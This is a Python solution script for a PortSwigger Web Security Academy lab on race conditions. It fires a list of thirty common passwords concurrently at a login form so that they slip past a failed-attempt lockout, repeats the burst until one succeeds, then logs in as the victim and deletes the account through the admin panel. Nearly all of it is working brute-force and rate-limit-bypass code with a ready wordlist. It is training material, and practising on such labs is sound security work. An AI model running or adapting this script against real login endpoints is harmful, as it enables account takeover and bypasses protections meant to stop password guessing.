#!/usr/bin/env python3
"""
Bypassing rate limits via race conditions
PortSwigger Web Security Academy -- Race Conditions

Companion script for the writeup: 02-bypassing-rate-limits-via-race-conditions.md

What this does:
    Fires thirty candidate passwords at POST /login for carlos, all inside one
    race window, on the theory that the failed-attempt counter is read at the
    start of request handling and only incremented afterward -- so a batch
    that all arrive before the first one finishes processing all see the same
    pre-lockout count. Our first implementation reused the raw HTTP/2
    single-packet socket engine from the limit-overrun lab, but this endpoint
    never responded to the connection preface over that raw approach, so it
    returned nothing at all. This script uses what actually worked instead:
    an httpx.AsyncClient with http2=True firing all thirty requests
    concurrently through asyncio.gather() -- multiplexed coroutines rather
    than hand-built h2 frames on a single socket, close enough together to
    land inside the same race window. Out of thirty, only around four
    consistently land before the lockout catches up, so the correct password
    has to be among those four on a given burst; the script re-fires the
    whole batch until a 302 to /my-account turns up.

Usage:
    python 02-bypassing-rate-limits-via-race-conditions.py <lab-url>

Requirements:
    pip install httpx[http2]
"""

import asyncio
import re
import sys

import httpx

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345",
    "1234", "111111", "1234567", "dragon", "123123", "baseball",
    "abc123", "football", "monkey", "letmein", "shadow", "master",
    "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
]

MAX_BURSTS = 20


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


async def solve_async(lab_url: str) -> None:
    async with httpx.AsyncClient(http2=True, timeout=15, follow_redirects=False) as client:
        found_password = None

        for burst in range(1, MAX_BURSTS + 1):
            r = await client.get(f"{lab_url}/login")
            csrf = _csrf(r.text)

            async def attempt(pw: str):
                resp = await client.post(
                    f"{lab_url}/login",
                    data={"csrf": csrf, "username": "carlos", "password": pw},
                )
                return pw, resp.status_code, resp.headers.get("location", "")

            print(f"[*] Burst {burst}/{MAX_BURSTS}: firing {len(PASSWORDS)} candidates via asyncio.gather()...")
            results = await asyncio.gather(*[attempt(pw) for pw in PASSWORDS])
            statuses = [status for _, status, _ in results]
            print(f"[*] Statuses: {statuses}")

            hit = next((pw for pw, status, loc in results if status == 302 and "/my-account" in loc), None)
            if hit:
                found_password = hit
                print(f"[+] FOUND PASSWORD: {hit} (landed inside the pre-lockout window)")
                break
            print("[-] No 302 in this burst -- rate limit caught every candidate, retrying")

        if not found_password:
            print("[-] Password not recovered after all bursts. Re-run the script.")
            return

        r = await client.get(f"{lab_url}/login")
        csrf = _csrf(r.text)
        await client.post(
            f"{lab_url}/login",
            data={"csrf": csrf, "username": "carlos", "password": found_password},
        )

        admin_r = await client.get(f"{lab_url}/admin", follow_redirects=True)
        del_csrf = _csrf(admin_r.text)
        await client.post(
            f"{lab_url}/admin/delete",
            data={"csrf": del_csrf, "username": "carlos"},
            follow_redirects=True,
        )

        check = await client.get(lab_url, follow_redirects=True)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- carlos's account deleted via the rate-limit-bypassed password.")
        else:
            print("[-] Not solved yet -- verify admin access and the delete request.")


def solve(lab_url: str) -> None:
    asyncio.run(solve_async(lab_url))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
